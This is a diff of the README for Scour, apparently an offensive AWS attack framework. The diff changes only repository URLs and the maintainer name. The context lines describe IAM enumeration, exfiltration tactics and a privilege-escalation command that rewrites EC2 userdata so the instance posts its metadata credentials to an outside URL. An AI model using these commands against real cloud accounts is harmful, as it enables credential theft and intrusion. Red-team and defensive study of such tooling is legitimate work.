@@ -9,10 +9,10 @@ AWS Attacks
 - Not ready for production
 
 - **Where to file issues**:
-[https://github.com/grines/scour/issues](https://github.com/grines/Scour/issues)
+[https://github.com/bulllabs/scour/issues](https://github.com/bulllabs/Scour/issues)
 
 - **Maintained by**:
-[grines](https://github.com/)
+[bulllabs](https://github.com/)
 
 # What is Scour?
 
@@ -30,14 +30,14 @@ Scour is written in golang so its easy to ship around as a binary.
 
 ##Gettable
 
-go get github.com/grines/scour
+go get github.com/bulllabs/scour
 
 ##Build
 
 go build main.go
 
 
-For a more detailed and user-friendly set of user instructions, please check out the Wiki's [installation guide](https://github.com/grines/scour/wiki/Installation). **coming soon
+For a more detailed and user-friendly set of user instructions, please check out the Wiki's [installation guide](https://github.com/bulllabs/scour/wiki/Installation). **coming soon
 
 ## Scour's Modules
 
@@ -83,7 +83,7 @@ The first time Scour is launched,
 * `Connected <apiuser/us-east-1> attack exfil <attack>` tab completion with list available exfiltration tactics
 
 ## Enumeration
-![](https://github.com/grines/scour/blob/main/scour-enum.gif)
+![](https://github.com/bulllabs/scour/blob/main/scour-enum.gif)
 * `Connected <apiuser/us-east-1> attack enum IAM` IAM discovery
 ```UA Tracking: exec-env/FhFIm7mvmp/nnK7NmJXNF/iam-enum
 +-------------+---------------------+------------------+---------------+--------------+
@@ -156,7 +156,7 @@ TBD
 ```
 
 ## PrivilegeEscalation
-![](https://github.com/grines/scour/blob/main/scour-privesc.gif)
+![](https://github.com/bulllabs/scour/blob/main/scour-privesc.gif)
 * `Connected <apiuser/us-east-1> attack privesc UserData i-0f5604708c0b51429 http://url.to.capture.post.data` steal metadata credentials from EC2. Stop instance / Update userdata to post credentials to supplied url / Start instance (sends EC2 token to URL.)
 ```
 [Sun May  9 06:10:16 2021]  INF  Stopping Instance i-0f5604708c0b51429 - State: stopped
@@ -165,7 +165,7 @@ TBD
 ```
 
 ## CredentialDiscovery
-![](https://github.com/grines/scour/blob/main/scour-creds.gif)
+![](https://github.com/bulllabs/scour/blob/main/scour-creds.gif)
 * `Connected <apiuser/us-east-1> attack creds UserData` loot credentials from EC2 userdata
 ```
 UA Tracking: exec-env/yzaqX9HFvP/oL1oho99ZP/userdata-creds
